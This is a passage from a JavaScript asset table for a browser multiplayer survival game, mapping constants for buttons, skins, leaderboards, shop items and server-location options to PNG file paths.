      NO_THANKS_BUTTON_IN: "img/no-thanks-button-in.png",
      NO_THANKS_BUTTON_CLICK: "img/no-thanks-button-click.png",
      SHOP_BUTTON_OUT: "img/shop-button-out.png",
      SHOP_BUTTON_IN: "img/shop-button-in.png",
      SHOP_BUTTON_CLICK: "img/shop-button-click.png",
      LOGOUT_OUT: "img/logout-out.png",
      LOGOUT_IN: "img/logout-in.png",
      LOGOUT_CLICK: "img/logout-click.png",
      TERMS_BUTTON_OUT: "img/terms-button-out.png",
      TERMS_BUTTON_IN: "img/terms-button-in.png",
      TERMS_BUTTON_CLICK: "img/terms-button-click.png",
      TUTORIAL_ICON: "img/tutorial-icon.png",
      SKINS_ICON: "img/skins-icon.png",
      SHOP_ICON: "img/shop-icon.png",
      PAINT_ICON: "img/paint-icon.png",
      LEADERBOARD_ICON: "img/leaderboard-icon.png",
      START_ICON: "img/start-icon.png",
      PROFILE_ICON: "img/profile-icon.png",
      SERVER_ACCESS_ICON: "img/server-access-icon2.png",
      ICONS_BG_BUTTON_OUT: "img/button-homepage-bg-out.png",
      ICONS_BG_BUTTON_IN: "img/button-homepage-bg-in.png",
      ICONS_BG_BUTTON_CLICK: "img/button-homepage-bg-click.png",
      ICONS_BOTTOM_BG_BUTTON_OUT: "img/button-bottom-homepage-bg-out.png",
      ICONS_BOTTOM_BG_BUTTON_IN: "img/button-bottom-homepage-bg-in.png",
      ICONS_BOTTOM_BG_BUTTON_CLICK: "img/button-bottom-homepage-bg-click.png",
      AVATAR_RESUME: "img/lvl-player.png",
      AVATAR_LVL1: "img/avatar-player.png",
      AVATAR_LVL2: "img/avatar-player1.png",
      AVATAR_LVL3: "img/avatar-player2.png",
      AVATAR_LVL4: "img/avatar-player3.png",
      AVATAR_LVL5: "img/avatar-player4.png",
      AVATAR_LVL6: "img/avatar-player5.png",
      AVATAR_LVL7: "img/avatar-player6.png",
      AVATAR_LVL8: "img/avatar-player7.png",
      AVATAR_LVL9: "img/avatar-player8.png",
      AVATAR_LVL10: "img/avatar-player9.png",
      AVATAR_LVL11: "img/avatar-player10.png",
      AVATAR_LVL12: "img/avatar-player11.png",
      AVATAR_LVL13: "img/avatar-player12.png",
      AVATAR_LVL14: "img/avatar-player13.png",
      AVATAR_LVL15: "img/avatar-player14.png",
      AVATAR_LVL16: "img/avatar-player14.png",
      AVATAR_LVL17: "img/avatar-player14.png",
      AVATAR_LVL18: "img/avatar-player14.png",
      GOLDEN_BREAD: "img/golden-bread.png",
      BUY_BREAD_OUT: "img/buy-bread-out.png",
      BUY_BREAD_IN: "img/buy-bread-in.png",
      BUY_BREAD_CLICK: "img/buy-bread-click.png",
      GAUGE: "img/gauge.png",
      SEASON_4: "img/season-4-out.png",
      SEASON_4_IN: "img/season-4-in.png",
      SEASON_4_OUT: "img/season-4-click.png",
      SEASON4_BOX: "img/season4-box.png",
      SEASON_5: "img/season-5-out.png",
      SEASON_5_IN: "img/season-5-in.png",
      SEASON_5_OUT: "img/season-5-click.png",
      SEASON5_BOX: "img/season5-box.png",
      PROFILE_BOX: "img/profile2-box.png",
      SKINS_BOX: "img/skins-box.png",
      SHOP_BOX: "img/shop-box.png",
      PRIVATE_SERVER_BOX: "img/private-server-box.png",
      SERVER_LOCATION_BOX: "img/location-box.png",
      SERVER_DURATION_BOX: "img/server-duration-box.png",
      TUTORIAL_BOX: "img/tutorial-box.png",
      LEADERBOARD_BOX: "img/leaderboard1-box.png",
      BUY_BREAD_BOX: "img/buy-breads-box.png",
      BAG_BOX: "img/bag-box.png",
      CRATE_BOX: "img/deadbox-box.png",
      BOOK_BOX: "img/book-box.png",
      ACCESSORIES_BOX: "img/accessories-box.png",
      CUSTOM_SKIN_BOX: "img/customskin-box.png",
      BAG_REMAIN_BOX: "img/bag-lasts.png",
      SERVER_REMAIN_BOX: "img/server-lasts.png",
      SERVER_ACCESS_BOX: "img/server-access-box2.png",
      LOOT_BOX: "img/lootbox-box.png",
      CHANGE_NICKNAME1_BOX: "img/change-nickname0.png",
      CHANGE_NICKNAME0_BOX: "img/change-nickname1.png",
      CHEATING_BOX: "img/cheating-box.png",
      DAILY_QUEST_BOX: "img/daily-quest-box.png",
      DAILY_5_BREAD: "img/daily-5-bread.png",
      DAILY_10_BREAD: "img/daily-10-bread.png",
      DAILY_VALID: "img/daily-valid.png",
      NORMAL_PROFILE_OUT: "img/normal-profile-out.png",
      NORMAL_PROFILE_IN: "img/normal-profile-in.png",
      NORMAL_PROFILE_CLICK: "img/normal-profile-click.png",
      FOREST_PROFILE_OUT: "img/forest-profile-out.png",
      FOREST_PROFILE_IN: "img/forest-profile-in.png",
      FOREST_PROFILE_CLICK: "img/forest-profile-click.png",
      ZOMBIE_PROFILE_OUT: "img/zombie-profile-out.png",
      ZOMBIE_PROFILE_IN: "img/zombie-profile-in.png",
      ZOMBIE_PROFILE_CLICK: "img/zombie-profile-click.png",
      VAMPIRE_PROFILE_OUT: "img/vampire-profile-out.png",
      VAMPIRE_PROFILE_IN: "img/vampire-profile-in.png",
      VAMPIRE_PROFILE_CLICK: "img/vampire-profile-click.png",
      TOTAL_PROFILE_OUT: "img/total-profile-out.png",
      TOTAL_PROFILE_IN: "img/total-profile-in.png",
      TOTAL_PROFILE_CLICK: "img/total-profile-click.png",
      SEASON1_PROFILE_OUT: "img/season1-profile-out.png",
      SEASON1_PROFILE_IN: "img/season1-profile-in.png",
      SEASON1_PROFILE_CLICK: "img/season1-profile-click.png",
      SEASON2_PROFILE_OUT: "img/season2-profile-out.png",
      SEASON2_PROFILE_IN: "img/season2-profile-in.png",
      SEASON2_PROFILE_CLICK: "img/season2-profile-click.png",
      SEASON3_PROFILE_OUT: "img/season3-profile-out.png",
      SEASON3_PROFILE_IN: "img/season3-profile-in.png",
      SEASON3_PROFILE_CLICK: "img/season3-profile-click.png",
      SEASON4_PROFILE_OUT: "img/season4-profile-out.png",
      SEASON4_PROFILE_IN: "img/season4-profile-in.png",
      SEASON4_PROFILE_CLICK: "img/season4-profile-click.png",
      SEASON5_PROFILE_OUT: "img/season5-profile-out.png",
      SEASON5_PROFILE_IN: "img/season5-profile-in.png",
      SEASON5_PROFILE_CLICK: "img/season5-profile-click.png",
      LOCKED_SKIN_ALERT: "img/locked-skin-alert.png",
      LOCKED_CUSTOM_ALERT: "img/locked-custom-alert.png",
      RED_LOCKED: "img/bg-red-locked.png",
      SKIN_BUTTON_OUT: "img/skin-button-out.png",
      SKIN_BUTTON_IN: "img/skin-button-in.png",
      SKIN_BUTTON_CLICK: "img/skin-button-click.png",
      ACCESSORY_BUTTON_OUT: "img/accessory-button-out.png",
      ACCESSORY_BUTTON_IN: "img/accessory-button-in.png",
      ACCESSORY_BUTTON_CLICK: "img/accessory-button-click.png",
      BAG_BUTTON_OUT: "img/bag-button-out.png",
      BAG_BUTTON_IN: "img/bag-button-in.png",
      BAG_BUTTON_CLICK: "img/bag-button-click.png",
      BOOK_BUTTON_OUT: "img/book-button-out.png",
      BOOK_BUTTON_IN: "img/book-button-in.png",
      BOOK_BUTTON_CLICK: "img/book-button-click.png",
      CRATE_BUTTON_OUT: "img/deadbox-button-out.png",
      CRATE_BUTTON_IN: "img/deadbox-button-in.png",
      CRATE_BUTTON_CLICK: "img/deadbox-button-click.png",
      LOOT_BUTTON_OUT: "img/loot-button-out.png",
      LOOT_BUTTON_IN: "img/loot-button-in.png",
      LOOT_BUTTON_CLICK: "img/loot-button-click.png",
      FREE_ITEM_OUT: "img/free-item-out.png",
      FREE_ITEM_IN: "img/free-item-in.png",
      FREE_ITEM_CLICK: "img/free-item-click.png",
      WOOD_ITEM_OUT: "img/wood-item-out.png",
      WOOD_ITEM_IN: "img/wood-item-in.png",
      WOOD_ITEM_CLICK: "img/wood-item-click.png",
      STONE_ITEM_OUT: "img/stone-item.png",
      STONE_ITEM_IN: "img/stone-item-in.png",
      STONE_ITEM_CLICK: "img/stone-item-click.png",
      GOLD_ITEM_OUT: "img/gold-item.png",
      GOLD_ITEM_IN: "img/gold-item-in.png",
      GOLD_ITEM_CLICK: "img/gold-item-click.png",
      DIAMOND_ITEM_OUT: "img/diamond-item.png",
      DIAMOND_ITEM_IN: "img/diamond-item-in.png",
      DIAMOND_ITEM_CLICK: "img/diamond-item-click.png",
      AMETHYST_ITEM_OUT: "img/amethyst-item.png",
      AMETHYST_ITEM_IN: "img/amethyst-item-in.png",
      AMETHYST_ITEM_CLICK: "img/amethyst-item-click.png",
      REIDITE_ITEM_OUT: "img/reidite-item.png",
      REIDITE_ITEM_IN: "img/reidite-item-in.png",
      REIDITE_ITEM_CLICK: "img/reidite-item-click.png",
      SPECIAL_ITEM_OUT: "img/special-item-out.png",
      SPECIAL_ITEM_IN: "img/special-item-in.png",
      SPECIAL_ITEM_CLICK: "img/special-item-click.png",
      LEVEL_ITEM_OUT: "img/level-item-out.png",
      LEVEL_ITEM_IN: "img/level-item-in.png",
      LEVEL_ITEM_CLICK: "img/level-item-click.png",
      SKIN_PREVIOUS_OUT: "img/skin-previous-out.png",
      SKIN_PREVIOUS_IN: "img/skin-previous-in.png",
      SKIN_PREVIOUS_CLICK: "img/skin-previous-click.png",
      SKIN_NEXT_OUT: "img/skin-next-out.png",
      SKIN_NEXT_IN: "img/skin-next-in.png",
      SKIN_NEXT_CLICK: "img/skin-next-click.png",
      BACK_BUTTON_OUT: "img/back-button-out.png",
      BACK_BUTTON_IN: "img/back-button-in.png",
      BACK_BUTTON_CLICK: "img/back-button-click.png",
      GET_MORE_BUTTON_OUT: "img/get-more-button-out.png",
      GET_MORE_BUTTON_IN: "img/get-more-button-in.png",
      GET_MORE_BUTTON_CLICK: "img/get-more-button-click.png",
      CURRENCY1_OUT: "img/currency1-out.png",
      CURRENCY1_IN: "img/currency1-in.png",
      CURRENCY1_CLICK: "img/currency1-click.png",
      CURRENCY2_OUT: "img/currency2-out.png",
      CURRENCY2_IN: "img/currency2-in.png",
      CURRENCY2_CLICK: "img/currency2-click.png",
      CURRENCY3_OUT: "img/currency3-out.png",
      CURRENCY3_IN: "img/currency3-in.png",
      CURRENCY3_CLICK: "img/currency3-click.png",
      CURRENCY4_OUT: "img/currency4-out.png",
      CURRENCY4_IN: "img/currency4-in.png",
      CURRENCY4_CLICK: "img/currency4-click.png",
      CURRENCY5_OUT: "img/currency5-out.png",
      CURRENCY5_IN: "img/currency5-in.png",
      CURRENCY5_CLICK: "img/currency5-click.png",
      PRICE1_OUT: "img/price1-out.png",
      PRICE1_IN: "img/price1-in.png",
      PRICE1_CLICK: "img/price1-click.png",
      PRICE2_OUT: "img/price2-out.png",
      PRICE2_IN: "img/price2-in.png",
      PRICE2_CLICK: "img/price2-click.png",
      PRICE3_OUT: "img/price3-out.png",
      PRICE3_IN: "img/price3-in.png",
      PRICE3_CLICK: "img/price3-click.png",
      PRICE4_OUT: "img/price4-out.png",
      PRICE4_IN: "img/price4-in.png",
      PRICE4_CLICK: "img/price4-click.png",
      PRICE5_OUT: "img/price5-out.png",
      PRICE5_IN: "img/price5-in.png",
      PRICE5_CLICK: "img/price5-click.png",
      BUY_PRIVATE_SERVER_OUT: "img/buy-private-server-out.png",
      BUY_PRIVATE_SERVER_IN: "img/buy-private-server-in.png",
      BUY_PRIVATE_SERVER_CLICK: "img/buy-private-server-click.png",
      ATLANTA_OUT: "img/atlanta-out.png",
      ATLANTA_IN: "img/atlanta-in.png",
      ATLANTA_CLICK: "img/atlanta-click.png",
      DALLAS_OUT: "img/dallas-out.png",
      DALLAS_IN: "img/dallas-in.png",
      DALLAS_CLICK: "img/dallas-click.png",
      FREMONT_OUT: "img/fremont-out.png",
      FREMONT_IN: "img/fremont-in.png",
      FREMONT_CLICK: "img/fremont-click.png",
      NEWARK_OUT: "img/newark-out.png",
      NEWARK_IN: "img/newark-in.png",
      NEWARK_CLICK: "img/newark-click.png",
      TORONTO_OUT: "img/toronto-out.png",
      TORONTO_IN: "img/toronto-in.png",
      TORONTO_CLICK: "img/toronto-click.png",
      SINGAPORE_OUT: "img/singapore-out.png",
      SINGAPORE_IN: "img/singapore-in.png",
      SINGAPORE_CLICK: "img/singapore-click.png",
      FRANKFURT_OUT: "img/frankfurt-out.png",
      FRANKFURT_IN: "img/frankfurt-in.png",
      FRANKFURT_CLICK: "img/frankfurt-click.png",
      LONDON_OUT: "img/london-out.png",
      LONDON_IN: "img/london-in.png",
      LONDON_CLICK: "img/london-click.png",
      MUMBAI_OUT: "img/mumbai-out.png",
      MUMBAI_IN: "img/mumbai-in.png",
      MUMBAI_CLICK: "img/mumbai-click.png",
      TOKYO_OUT: "img/tokyo-out.png",
      TOKYO_IN: "img/tokyo-in.png",
      TOKYO_CLICK: "img/tokyo-click.png",
      YES_LOCATION_OUT: "img/yes-location-out.png",
      YES_LOCATION_IN: "img/yes-location-in.png",
      YES_LOCATION_CLICK: "img/yes-location-click.png",
      DAYS3_OUT: "img/3days-out.png",
      DAYS3_IN: "img/3days-in.png",
      DAYS3_CLICK: "img/3days-click.png",
      DAYS7_OUT: "img/7days-out.png",
      DAYS7_IN: "img/7days-in.png",
      DAYS7_CLICK: "img/7days-click.png",
      DAYS30_OUT: "img/30days-out.png",
      DAYS30_IN: "img/30days-in.png",
      DAYS30_CLICK: "img/30days-click.png",
      DAYS90_OUT: "img/90days-out.png",
      DAYS90_IN: "img/90days-in.png",
      DAYS90_CLICK: "img/90days-click.png",
      SPIN1: "img/spin1.png",
      SPIN2: "img/spin2.png",
      SPIN3: "img/spin3.png",
      SPIN4: "img/spin4.png",
      SPIN5: "img/spin5.png",
      SPIN6: "img/spin6.png",
      ARROW_SPIN: "img/arrow-spin.png",
      SPIN_BUTTON_1_OUT: "img/spin-button-1-out.png",
      SPIN_BUTTON_1_IN: "img/spin-button-1-in.png",
      SPIN_BUTTON_1_CLICK: "img/spin-button-1-click.png",
      SPIN_BUTTON_2_OUT: "img/spin-button-2-out.png",
      SPIN_BUTTON_2_IN: "img/spin-button-2-in.png",
      SPIN_BUTTON_2_CLICK: "img/spin-button-2-click.png",
      SPIN_BUTTON_3_OUT: "img/spin-button-3-out.png",
      SPIN_BUTTON_3_IN: "img/spin-button-3-in.png",
      SPIN_BUTTON_3_CLICK: "img/spin-button-3-click.png",
      SPIN_BUTTON_4_OUT: "img/spin-button-4-out.png",
      SPIN_BUTTON_4_IN: "img/spin-button-4-in.png",
      SPIN_BUTTON_4_CLICK: "img/spin-button-4-click.png",
      SPIN_BUTTON_5_OUT: "img/spin-button-5-out.png",
      SPIN_BUTTON_5_IN: "img/spin-button-5-in.png",
      SPIN_BUTTON_5_CLICK: "img/spin-button-5-click.png",
      SPIN_LIGHT: "img/spin-light.png",
      TUTO_WIKI_OUT: "img/tuto-wiki-out.png",
      TUTO_WIKI_IN: "img/tuto-wiki-in.png",
      TUTO_WIKI_CLICK: "img/tuto-wiki-click.png",
      TUTO_PREVIOUS_OUT: "img/tuto-previous-out.png",
      TUTO_PREVIOUS_IN: "img/tuto-previous-in.png",
      TUTO_PREVIOUS_CLICK: "img/tuto-previous-click.png",
      TUTO_NEXT_OUT: "img/tuto-next-out.png",
      TUTO_NEXT_IN: "img/tuto-next-in.png",
      TUTO_NEXT_CLICK: "img/tuto-next-click.png",
      TIME_LEADERBOARD_OUT: "img/time-leaderboard-out.png",
      TIME_LEADERBOARD_IN: "img/time-leaderboard-in.png",
      TIME_LEADERBOARD_CLICK: "img/time-leaderboard-click.png",
      SCORE_LEADERBOARD_OUT: "img/score-leaderboard-out.png",
      SCORE_LEADERBOARD_IN: "img/score-leaderboard-in.png",
      SCORE_LEADERBOARD_CLICK: "img/score-leaderboard-click.png",
      LVL_LEADERBOARD_OUT: "img/lvl-leaderboard-out.png",
      LVL_LEADERBOARD_IN: "img/lvl-leaderboard-in.png",
      LVL_LEADERBOARD_CLICK: "img/lvl-leaderboard-click.png",
      KILL_LEADERBOARD_OUT: "img/kill-leaderboard-out.png",
      KILL_LEADERBOARD_IN: "img/kill-leaderboard-in.png",
      KILL_LEADERBOARD_CLICK: "img/kill-leaderboard-click.png",
      ALL_LEADERBOARD_OUT: "img/all-leaderboard-out.png",
      ALL_LEADERBOARD_IN: "img/all-leaderboard-in.png",
      ALL_LEADERBOARD_CLICK: "img/all-leaderboard-click.png",
      TODAY_LEADERBOARD_OUT: "img/today-leaderboard-out.png",
      TODAY_LEADERBOARD_IN: "img/today-leaderboard-in.png",
      TODAY_LEADERBOARD_CLICK: "img/today-leaderboard-click.png",
      WEEK_LEADERBOARD_OUT: "img/week-leaderboard-out.png",
      WEEK_LEADERBOARD_IN: "img/week-leaderboard-in.png",
      WEEK_LEADERBOARD_CLICK: "img/week-leaderboard-click.png",
      SEASON1_LEADERBOARD_OUT: "img/season1-out.png",
      SEASON1_LEADERBOARD_IN: "img/season1-in.png",
      SEASON1_LEADERBOARD_CLICK: "img/season1-click.png",
      SEASON2_LEADERBOARD_OUT: "img/season2--out.png",
      SEASON2_LEADERBOARD_IN: "img/season2--in.png",
      SEASON2_LEADERBOARD_CLICK: "img/season2--click.png",
      SEASON3_LEADERBOARD_OUT: "img/season3-out.png",
      SEASON3_LEADERBOARD_IN: "img/season3-in.png",
      SEASON3_LEADERBOARD_CLICK: "img/season3-click.png",
      SEASON4_LEADERBOARD_OUT: "img/season4-out.png",
      SEASON4_LEADERBOARD_IN: "img/season4-in.png",
      SEASON4_LEADERBOARD_CLICK: "img/season4-click.png",
      SEASON5_LEADERBOARD_OUT: "img/season5-out.png",
      SEASON5_LEADERBOARD_IN: "img/season5-in.png",
      SEASON5_LEADERBOARD_CLICK: "img/season5-click.png",
      TOTAL_LEAD_OUT: "img/total-lead-out.png",
      TOTAL_LEAD_IN: "img/total-lead-in.png",
      TOTAL_LEAD_CLICK: "img/total-lead-click.png",
      NORMAL_LEAD_OUT: "img/normal-lead-out.png",
      NORMAL_LEAD_IN: "img/normal-lead-in.png",
      NORMAL_LEAD_CLICK: "img/normal-lead-click.png",
      FOREST_LEAD_OUT: "img/forest-lead-out.png",
      FOREST_LEAD_IN: "img/forest-lead-in.png",
      FOREST_LEAD_CLICK: "img/forest-lead-click.png",
      VAMPIRE_LEAD_OUT: "img/vampire-lead-out.png",
      VAMPIRE_LEAD_IN: "img/vampire-lead-in.png",
      VAMPIRE_LEAD_CLICK: "img/vampire-lead-click.png",
      ZOMBIE_LEAD_OUT: "img/zombie-lead-out.png",
      ZOMBIE_LEAD_IN: "img/zombie-lead-in.png",
      ZOMBIE_LEAD_CLICK: "img/zombie-lead-click.png",
      LEVEL5D: "img/day-level5.png",
      LEVEL5N: "img/night-level5.png",
      LEVEL10D: "img/day-level10.png",
      LEVEL10N: "img/night-level10.png",
      LEVEL15D: "img/day-level15.png",
      LEVEL15N: "img/night-level15.png",
      LEVEL20D: "img/day-level20.png",
      LEVEL20N: "img/night-level20.png",
      LEVEL25D: "img/day-level25.png",
      LEVEL25N: "img/night-level25.png",
      LEVEL30D: "img/day-level30.png",
      LEVEL30N: "img/night-level30.png",
      LEVEL35D: "img/day-level35.png",
      LEVEL35N: "img/night-level35.png",
      LEVEL40D: "img/day-level40.png",
      LEVEL40N: "img/night-level40.png",
      LEVEL45D: "img/day-level45.png",
      LEVEL45N: "img/night-level45.png",
      LEVEL50D: "img/day-level50.png",
      LEVEL50N: "img/night-level50.png",
      LEVEL55D: "img/day-level55.png",
      LEVEL55N: "img/night-level55.png",
      LEVEL60D: "img/day-level60.png",
      LEVEL60N: "img/night-level60.png",
      SKIN_DEVASTD: "img/day-skin-devast0.png",
      SKIN_DEVASTN: "img/night-skin-devast0.png",
      HAND_DEVASTD: "img/day-hand-devaster.png",
      HAND_DEVASTN: "img/night-hand-devaster.png",
      SKIN_STARD: "img/day-skin-star0.png",
      SKIN_STARN: "img/night-skin-star0.png",
      HAND_STARD: "img/day-hand-star0.png",
      HAND_STARN: "img/night-hand-star0.png",
      SKIN_VAMPIRED: "img/day-vampire.png",
      SKIN_VAMPIREN: "img/night-vampire.png",
      HAND_VAMPIRED: "img/day-hand-vampire.png",
      HAND_VAMPIREN: "img/night-hand-vampire.png",
      SKIN_ZOMBIED: "img/day-zombie.png",
      SKIN_ZOMBIEN: "img/night-zombie.png",
      HAND_ZOMBIED: "img/day-hand-zombie.png",
      HAND_ZOMBIEN: "img/night-hand-zombie.png",
      SKIN_ROBOTD: "img/day-skin113.png",
      SKIN_ROBOTN: "img/night-skin113.png",
      HAND_ROBOTD: "img/day-hand-skin113.png",
      HAND_ROBOTN: "img/night-hand-skin113.png",
      SKIN0D: "img/day-skin0.png",
      SKIN0N: "img/night-skin0.png",
      SKIN1D: "img/day-skin1.png",
      SKIN1N: "img/night-skin1.png",
      SKIN2D: "img/day-skin2.png",
      SKIN2N: "img/night-skin2.png",
      SKIN3D: "img/day-skin3.png",
      SKIN3N: "img/night-skin3.png",
      SKIN4D: "img/day-skin4.png",
      SKIN4N: "img/night-skin4.png",
      SKIN5D: "img/day-skin5.png",
      SKIN5N: "img/night-skin5.png",
      SKIN6D: "img/day-skin6.png",
      SKIN6N: "img/night-skin6.png",
      SKIN7D: "img/day-skin7.png",
      SKIN7N: "img/night-skin7.png",
      SKIN8D: "img/day-skin8.png",
      SKIN8N: "img/night-skin8.png",
      SKIN9D: "img/day-skin9.png",
      SKIN9N: "img/night-skin9.png",
      SKIN10D: "img/day-skin10.png",
      SKIN10N: "img/night-skin10.png",
      SKIN11D: "img/day-skin11.png",
      SKIN11N: "img/night-skin11.png",
      SKIN12D: "img/day-skin12.png",
      SKIN12N: "img/night-skin12.png",
      SKIN13D: "img/day-skin13.png",
      SKIN13N: "img/night-skin13.png",
      SKIN14D: "img/day-skin14.png",
      SKIN14N: "img/night-skin14.png",
      SKIN15D: "img/day-skin15.png",
      SKIN15N: "img/night-skin15.png",
      SKIN16D: "img/day-skin16.png",
      SKIN16N: "img/night-skin16.png",
      SKIN17D: "img/day-skin17.png",
      SKIN17N: "img/night-skin17.png",
      SKIN18D: "img/day-skin18.png",
      SKIN18N: "img/night-skin18.png",
      SKIN19D: "img/day-skin19.png",
      SKIN19N: "img/night-skin19.png",
      SKIN20D: "img/day-skin20.png",
      SKIN20N: "img/night-skin20.png",
      SKIN21D: "img/day-skin21.png",
      SKIN21N: "img/night-skin21.png",
      SKIN22D: "img/day-skin22.png",
      SKIN22N: "img/night-skin22.png",
      SKIN23D: "img/day-skin23.png",
      SKIN23N: "img/night-skin23.png",
      SKIN24D: "img/day-skin24.png",
      SKIN24N: "img/night-skin24.png",
      SKIN25D: "img/day-skin25.png",
      SKIN25N: "img/night-skin25.png",
      SKIN26D: "img/day-skin26.png",
      SKIN26N: "img/night-skin26.png",
      SKIN27D: "img/day-skin27.png",
      SKIN27N: "img/night-skin27.png",
      SKIN28D: "img/day-skin28.png",
      SKIN28N: "img/night-skin28.png",
      SKIN29D: "img/day-skin29.png",
      SKIN29N: "img/night-skin29.png",
      SKIN30D: "img/day-skin30.png",
      SKIN30N: "img/night-skin30.png",
      SKIN31D: "img/day-skin31.png",
      SKIN31N: "img/night-skin31.png",
      SKIN32D: "img/day-skin32.png",
      SKIN32N: "img/night-skin32.png",
      SKIN33D: "img/day-skin33.png",
      SKIN33N: "img/night-skin33.png",
      SKIN34D: "img/day-skin34.png",
      SKIN34N: "img/night-skin34.png",
      SKIN35D: "img/day-skin35.png",
      SKIN35N: "img/night-skin35.png",
      SKIN36D: "img/day-skin36.png",
      SKIN36N: "img/night-skin36.png",
      SKIN37D: "img/day-skin37.png",
      SKIN37N: "img/night-skin37.png",
      SKIN38D: "img/day-skin38.png",
      SKIN38N: "img/night-skin38.png",
      SKIN39D: "img/day-skin39.png",
      SKIN39N: "img/night-skin39.png",
      SKIN40D: "img/day-skin40.png",
      SKIN40N: "img/night-skin40.png",
      SKIN41D: "img/day-skin41.png",
      SKIN41N: "img/night-skin41.png",
      SKIN42D: "img/day-skin42.png",
      SKIN42N: "img/night-skin42.png",
      SKIN43D: "img/day-skin43.png",
      SKIN43N: "img/night-skin43.png",
      SKIN44D: "img/day-skin44.png",
      SKIN44N: "img/night-skin44.png",
      SKIN45D: "img/day-skin45.png",
      SKIN45N: "img/night-skin45.png",
      SKIN46D: "img/day-skin46.png",
      SKIN46N: "img/night-skin46.png",
      SKIN47D: "img/day-skin47.png",
      SKIN47N: "img/night-skin47.png",
      SKIN48D: "img/day-skin48.png",
      SKIN48N: "img/night-skin48.png",
      SKIN49D: "img/day-skin49.png",
      SKIN49N: "img/night-skin49.png",
      SKIN50D: "img/day-skin50.png",
      SKIN50N: "img/night-skin50.png",
      SKIN51D: "img/day-skin51.png",
      SKIN51N: "img/night-skin51.png",
      SKIN52D: "img/day-skin52.png",
      SKIN52N: "img/night-skin52.png",
      SKIN53D: "img/day-skin53.png",
      SKIN53N: "img/night-skin53.png",
      SKIN54D: "img/day-skin54.png",
      SKIN54N: "img/night-skin54.png",
      SKIN55D: "img/day-skin55.png",
      SKIN55N: "img/night-skin55.png",
      SKIN56D: "img/day-skin56.png",
      SKIN56N: "img/night-skin56.png",
      SKIN57D: "img/day-skin57.png",
      SKIN57N: "img/night-skin57.png",
      SKIN58D: "img/day-skin58.png",
      SKIN58N: "img/night-skin58.png",
      SKIN59D: "img/day-skin59.png",
      SKIN59N: "img/night-skin59.png",
      SKIN60D: "img/day-skin60.png",
      SKIN60N: "img/night-skin60.png",
      SKIN61D: "img/day-skin61.png",
      SKIN61N: "img/night-skin61.png",
      SKIN62D: "img/day-skin62.png",
      SKIN62N: "img/night-skin62.png",
      SKIN63D: "img/day-skin63.png",
      SKIN63N: "img/night-skin63.png",
      SKIN64D: "img/day-skin64.png",
      SKIN64N: "img/night-skin64.png",
      SKIN65D: "img/day-skin65.png",
      SKIN65N: "img/night-skin65.png",
      SKIN66D: "img/day-skin66.png",
      SKIN66N: "img/night-skin66.png",
      SKIN67D: "img/day-skin67.png",
      SKIN67N: "img/night-skin67.png",
      SKIN68D: "img/day-skin68.png",
      SKIN68N: "img/night-skin68.png",
      SKIN69D: "img/day-skin69.png",
      SKIN69N: "img/night-skin69.png",
      SKIN70D: "img/day-skin70.png",
      SKIN70N: "img/night-skin70.png",
      SKIN71D: "img/day-skin71.png",
      SKIN71N: "img/night-skin71.png",
      SKIN72D: "img/day-skin72.png",
      SKIN72N: "img/night-skin72.png",
      SKIN73D: "img/day-skin73.png",
      SKIN73N: "img/night-skin73.png",
      SKIN74D: "img/day-skin74.png",
      SKIN74N: "img/night-skin74.png",
      SKIN75D: "img/day-skin75.png",
      SKIN75N: "img/night-skin75.png",
      SKIN76D: "img/day-skin76.png",
      SKIN76N: "img/night-skin76.png",
      SKIN77D: "img/day-skin77.png",
      SKIN77N: "img/night-skin77.png",
      SKIN78D: "img/day-skin78.png",
      SKIN78N: "img/night-skin78.png",
      SKIN79D: "img/day-skin79.png",
      SKIN79N: "img/night-skin79.png",
      SKIN80D: "img/day-skin80.png",
      SKIN80N: "img/night-skin80.png",
      SKIN81D: "img/day-skin81.png",
      SKIN81N: "img/night-skin81.png",
      SKIN82D: "img/day-skin82.png",
      SKIN82N: "img/night-skin82.png",
      SKIN83D: "img/day-skin83.png",
      SKIN83N: "img/night-skin83.png",
      SKIN84D: "img/day-skin84.png",
      SKIN84N: "img/night-skin84.png",
      SKIN85D: "img/day-skin85.png",
      SKIN85N: "img/night-skin85.png",
      SKIN86D: "img/day-skin86.png",
      SKIN86N: "img/night-skin86.png",
      SKIN87D: "img/day-skin87.png",
      SKIN87N: "img/night-skin87.png",
      SKIN88D: "img/day-skin88.png",
      SKIN88N: "img/night-skin88.png",
      SKIN89D: "img/day-skin89.png",
      SKIN89N: "img/night-skin89.png",
      SKIN90D: "img/day-skin90.png",
      SKIN90N: "img/night-skin90.png",
      SKIN91D: "img/day-skin91.png",
      SKIN91N: "img/night-skin91.png",
      SKIN92D: "img/day-skin92.png",
      SKIN92N: "img/night-skin92.png",
      SKIN93D: "img/day-skin93.png",
      SKIN93N: "img/night-skin93.png",
      SKIN94D: "img/day-skin94.png",
      SKIN94N: "img/night-skin94.png",
      SKIN95D: "img/day-skin95.png",
      SKIN95N: "img/night-skin95.png",
      SKIN96D: "img/day-skin96.png",
      SKIN96N: "img/night-skin96.png",
      SKIN97D: "img/day-skin97.png",
      SKIN97N: "img/night-skin97.png",
      SKIN98D: "img/day-skin98.png",
      SKIN98N: "img/night-skin98.png",
      SKIN99D: "img/day-skin99.png",
      SKIN99N: "img/night-skin99.png",
      SKIN100D: "img/day-skin100.png",
      SKIN100N: "img/night-skin100.png",
      SKIN101D: "img/day-skin101.png",
      SKIN101N: "img/night-skin101.png",
      SKIN102D: "img/day-skin102.png",
      SKIN102N: "img/night-skin102.png",
      SKIN103D: "img/day-skin103.png",
      SKIN103N: "img/night-skin103.png",
      SKIN104D: "img/day-skin104.png",
      SKIN104N: "img/night-skin104.png",
      SKIN105D: "img/day-skin105.png",
      SKIN105N: "img/night-skin105.png",
      SKIN106D: "img/day-skin106.png",
      SKIN106N: "img/night-skin106.png",
      SKIN107D: "img/day-skin107.png",
      SKIN107N: "img/night-skin107.png",
      SKIN108D: "img/day-skin108.png",
      SKIN108N: "img/night-skin108.png",
      SKIN109D: "img/day-skin109.png",
      SKIN109N: "img/night-skin109.png",
      SKIN110D: "img/day-skin110.png",
      SKIN110N: "img/night-skin110.png",
      SKIN111D: "img/day-skin111.png",
      SKIN111N: "img/night-skin111.png",
      SKIN112D: "img/day-skin112.png",
      SKIN112N: "img/night-skin112.png",
      SKIN113D: "img/day-skin113.png",
      SKIN113N: "img/night-skin113.png",
      SKIN114D: "img/day-skin114.png",
      SKIN114N: "img/night-skin114.png",
      SKIN115D: "img/day-skin115.png",
      SKIN115N: "img/night-skin115.png",
      SKIN116D: "img/day-skin116.png",
